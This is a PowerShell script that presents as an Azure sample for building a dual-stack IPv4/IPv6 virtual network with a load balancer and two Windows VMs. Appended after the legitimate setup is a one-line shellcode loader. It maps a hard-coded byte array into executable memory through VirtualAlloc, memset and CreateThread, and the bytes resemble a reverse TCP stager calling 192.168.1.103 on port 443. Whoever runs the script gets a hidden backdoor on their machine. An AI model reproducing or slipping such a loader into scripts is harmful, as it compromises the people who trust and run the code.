




Register-AzProviderFeature -FeatureName AllowIPv6VirtualNetwork -ProviderNamespace Microsoft.Network
Get-AzProviderFeature -FeatureName AllowIPv6VirtualNetwork -ProviderNamespace Microsoft.Network
Register-AzResourceProvider -ProviderNamespace Microsoft.Network

$rg = New-AzResourceGroup -ResourceGroupName "dsRG1" -Location "east us"


$PublicIP_v4 = New-AzPublicIpAddress -Name "dsPublicIP_v4" -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -AllocationMethod Dynamic -IpAddressVersion IPv4
$PublicIP_v6 = New-AzPublicIpAddress -Name "dsPublicIP_v6" -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -AllocationMethod Dynamic -IpAddressVersion IPv6

$RdpPublicIP_1 = New-AzPublicIpAddress -Name "RdpPublicIP_1" -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -AllocationMethod Dynamic -IpAddressVersion IPv4
$RdpPublicIP_2 = New-AzPublicIpAddress -Name "RdpPublicIP_2" -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -AllocationMethod Dynamic -IpAddressVersion IPv4



$frontendIPv4 = New-AzLoadBalancerFrontendIpConfig -Name "dsLbFrontEnd_v4" -PublicIpAddress $PublicIP_v4
$frontendIPv6 = New-AzLoadBalancerFrontendIpConfig -Name "dsLbFrontEnd_v6" -PublicIpAddress $PublicIP_v6

$backendPoolv4 = New-AzLoadBalancerBackendAddressPoolConfig -Name "dsLbBackEndPool_v4"
$backendPoolv6 = New-AzLoadBalancerBackendAddressPoolConfig -Name "dsLbBackEndPool_v6"

$lbrule_v4 = New-AzLoadBalancerRuleConfig -Name "dsLBrule_v4" -FrontendIpConfiguration $frontendIPv4 -BackendAddressPool $backendPoolv4 -Protocol Tcp -FrontendPort 80 -BackendPort 80
$lbrule_v6 = New-AzLoadBalancerRuleConfig -Name "dsLBrule_v6" -FrontendIpConfiguration $frontendIPv6 -BackendAddressPool $backendPoolv6 -Protocol Tcp -FrontendPort 80 -BackendPort 80

$lb = New-AzLoadBalancer -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -Name "MyLoadBalancer" -Sku "Basic" -FrontendIpConfiguration $frontendIPv4,$frontendIPv6 -BackendAddressPool $backendPoolv4,$backendPoolv6 -LoadBalancingRule $lbrule_v4,$lbrule_v6


$avset = New-AzAvailabilitySet -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -Name "dsAVset" -PlatformFaultDomainCount 2 -PlatformUpdateDomainCount 2 -Sku aligned


$rule1 = New-AzNetworkSecurityRuleConfig -Name 'myNetworkSecurityGroupRuleRDP' -Description 'Allow RDP' -Access Allow -Protocol Tcp -Direction Inbound -Priority 100 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * -DestinationPortRange 3389
$rule2 = New-AzNetworkSecurityRuleConfig -Name 'myNetworkSecurityGroupRuleHTTP' -Description 'Allow HTTP' -Access Allow -Protocol Tcp -Direction Inbound -Priority 200 -SourceAddressPrefix * -SourcePortRange 80 -DestinationAddressPrefix * -DestinationPortRange 80

$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -Name "dsNSG1" -SecurityRules $rule1,$rule2



$subnet = New-AzVirtualNetworkSubnetConfig -Name "dsSubnet" -AddressPrefix "10.0.0.0/24","ace:cab:deca:deed::/64"


$vnet = New-AzVirtualNetwork -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location -Name "dsVnet" -AddressPrefix "10.0.0.0/16","ace:cab:deca::/48" -Subnet $subnet


$Ip4Config=New-AzNetworkInterfaceIpConfig -Name dsIp4Config -Subnet $vnet.subnets[0] -PrivateIpAddressVersion IPv4 -LoadBalancerBackendAddressPool $backendPoolv4 -PublicIpAddress  $RdpPublicIP_1
$Ip6Config=New-AzNetworkInterfaceIpConfig -Name dsIp6Config -Subnet $vnet.subnets[0] -PrivateIpAddressVersion IPv6 -LoadBalancerBackendAddressPool $backendPoolv6
$NIC_1 = New-AzNetworkInterface -Name "dsNIC1" -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location  -NetworkSecurityGroupId $nsg.Id -IpConfiguration $Ip4Config,$Ip6Config 
$Ip4Config=New-AzNetworkInterfaceIpConfig -Name dsIp4Config -Subnet $vnet.subnets[0] -PrivateIpAddressVersion IPv4 -LoadBalancerBackendAddressPool $backendPoolv4 -PublicIpAddress  $RdpPublicIP_2
$NIC_2 = New-AzNetworkInterface -Name "dsNIC2" -ResourceGroupName $rg.ResourceGroupName -Location $rg.Location  -NetworkSecurityGroupId $nsg.Id -IpConfiguration $Ip4Config,$Ip6Config 



$cred = get-credential -Message "DUAL STACK VNET SAMPLE:  Please enter the Administrator credential to log into the VM's"

$vmsize = "Standard_A2"
$ImagePublisher = "MicrosoftWindowsServer"
$imageOffer = "WindowsServer"
$imageSKU = "2016-Datacenter"

$vmName= "dsVM1"
$VMconfig1 = New-AzVMConfig -VMName $vmName -VMSize $vmsize -AvailabilitySetId $avset.Id 3> $null | Set-AzVMOperatingSystem -Windows -ComputerName $vmName -Credential $cred -ProvisionVMAgent 3> $null | Set-AzVMSourceImage -PublisherName $ImagePublisher -Offer $imageOffer -Skus $imageSKU -Version "latest" 3> $null | Set-AzVMOSDisk -Name "$vmName.vhd" -CreateOption fromImage  3> $null | Add-AzVMNetworkInterface -Id $NIC_1.Id  3> $null 
$VM1 = New-AzVM -ResourceGroupName $rg.ResourceGroupName  -Location $rg.Location  -VM $VMconfig1 

$vmName= "dsVM2"
$VMconfig2 = New-AzVMConfig -VMName $vmName -VMSize $vmsize -AvailabilitySetId $avset.Id 3> $null | Set-AzVMOperatingSystem -Windows -ComputerName $vmName -Credential $cred -ProvisionVMAgent 3> $null | Set-AzVMSourceImage -PublisherName $ImagePublisher -Offer $imageOffer -Skus $imageSKU -Version "latest" 3> $null | Set-AzVMOSDisk -Name "$vmName.vhd" -CreateOption fromImage  3> $null | Add-AzVMNetworkInterface -Id $NIC_2.Id  3> $null 
$VM2 = New-AzVM -ResourceGroupName $rg.ResourceGroupName  -Location $rg.Location  -VM $VMconfig2 


$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

